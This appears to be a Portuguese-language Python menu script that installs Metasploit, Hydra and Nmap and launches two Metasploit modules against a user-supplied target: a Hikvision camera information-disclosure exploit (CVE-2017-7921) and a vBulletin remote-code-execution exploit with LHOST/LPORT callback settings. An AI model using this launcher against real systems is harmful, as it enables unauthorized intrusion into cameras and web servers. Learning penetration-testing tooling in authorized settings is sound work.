import os
import sys
import webbrowser

def exibir_aviso():
    input("ATENÇÃO: Não use para fins maliciosos. Eu, como autor, não me responsabilizo. Pressione Enter para continuar.")
    os.system("clear")

def msfconsole_simples():
    print("Exploits disponíveis: 1-camera, 2-windows")
    exp = input("Escolha um exploit: ").strip()
    if exp == '1':
        exploit = 'auxiliary/gather/hikvision_info_disclosure_cve_2017_7921'
    elif exp == '2':
        exploit = 'multi/http/vbulletin_widget_template_rce'
    else:
        input("Valor inválido, pressione Enter para voltar ao menu...")
        return

    os.system("clear")
    print(f"Exploit selecionado: {exploit}")
    alvo = input("IP do alvo: ").strip()
    porta = input("Porta a ser atacada: ").strip()
    lhost = input("Seu IP (se necessário): ").strip()
    lport = input("Sua porta: ").strip()

    confirmar = input("Continuar? (S/N): ").strip().lower()
    if confirmar == 's':
        comando = f"msfconsole -q -x 'use {exploit}; set RHOSTS {alvo}; set RPORT {porta};"
        if lhost:
            comando += f" set LHOST {lhost};"
        if lport:
            comando += f" set LPORT {lport};"
        comando += " exploit'"

        print("Iniciando o Metasploit...")
        os.system(comando)
    else:
        print("Cancelado pelo usuário. Retornando ao menu...")
        input("Pressione Enter para continuar.")

def instalar_ferramentas():
    while True:
        print("""\
        =============================
          INSTALAÇÃO DE FERRAMENTAS
        =============================
        1 - Atualizar pacotes
        2 - Atualizar sistema
        3 - Atualização completa
        4 - Instalar Metasploit
        5 - Instalar Hydra
        6 - Instalar Nmap
        99 - Voltar ao menu
        =============================
        """)
        opcao = input("_kamy-toolsdk--> ").strip()

        if opcao == '1':
            os.system('sudo apt update')
        elif opcao == '2':
            os.system('sudo apt upgrade -y')
        elif opcao == '3':
            os.system('sudo apt update -y && sudo apt upgrade -y')
        elif opcao == '4':
            os.system('sudo apt install -y metasploit-framework')
        elif opcao == '5':
            os.system('sudo apt install -y hydra')
        elif opcao == '6':
            os.system('sudo apt install -y nmap')
        elif opcao == '99':
            break
        else:
            print("Opção inválida. Tente novamente.")

def ajuda():
    print("""\
    ============================
              AJUDA
    ============================
    1. msfconsole-simples: Configura exploits no Metasploit.
    2. Instalar ferramentas: Instala pacotes essenciais.
    3. Ajuda: Exibe este menu.
    4. Sair: Encerra o programa.
    ============================
    """)
    input("Pressione Enter para voltar ao menu principal.")

def opcoes_avancadas():
    while True:
        print("""\
        =======================
             OPÇÕES AVANÇADAS
        =======================
        1 - Ver seu IP
        2 - Apoiar o criador (recomendado)
        3 - Teste de conexão
        99 - Sair para o menu principal
        =======================
        """)
        escolha = input("kamydK-o--> ").strip()

        if escolha == '1':
            os.system("ifconfig")
            input("Pressione Enter para continuar.")
        elif escolha == '2':
            apoiar_criador()
        elif escolha == '3':
            os.system('ping google.com')
            input("Pressione Enter para continuar.")
        elif escolha == '99':
            break
        else:
            print("Opção inválida. Tente novamente.")

def apoiar_criador():
    opcoes = {
        "1": "https://www.instagram.com/kamy_z7/",
        "2": "https://www.youtube.com/@Kamy_z7/",
        "3": "https://github.com/null070/"
    }
    while True:
        print("""\
        ===================
          APOIAR O CRIADOR
        ===================
        1 - Instagram
        2 - YouTube
        3 - GitHub
        99 - Voltar
        ===================
        """)
        escolha = input("kamydK-o-suporte--> ").strip()

        if escolha in opcoes:
            webbrowser.open(opcoes[escolha])
        elif escolha == '99':
            break
        else:
            print("Opção inválida. Tente novamente.")

def menu():
    while True:
        os.system("clear")
        print("Feito por Kamy")
        print('v1.0.1')
        print("Para sair, pressione Ctrl + C")
        print("""\
        ==============================
        MENU DE FERRAMENTAS
        ==============================
        1 - msfconsole-simples
        2 - Instalar ferramentas
        3 - Ajuda
        4 - Sair
        ==============================
        -o - Opções avançadas
        ==============================
        """)
        opcao = input("_kamy-toolsdk--> ").strip()

        if opcao == '1':
            msfconsole_simples()
        elif opcao == '2':
            instalar_ferramentas()
        elif opcao == '3':
            ajuda()
        elif opcao == '4':
            print("Obrigado por usar a ferramenta!")
            sys.exit()
        elif opcao == '-o':
            opcoes_avancadas()
        else:
            print("Opção inválida. Tente novamente.")

if __name__ == "__main__":
    exibir_aviso()
    menu()
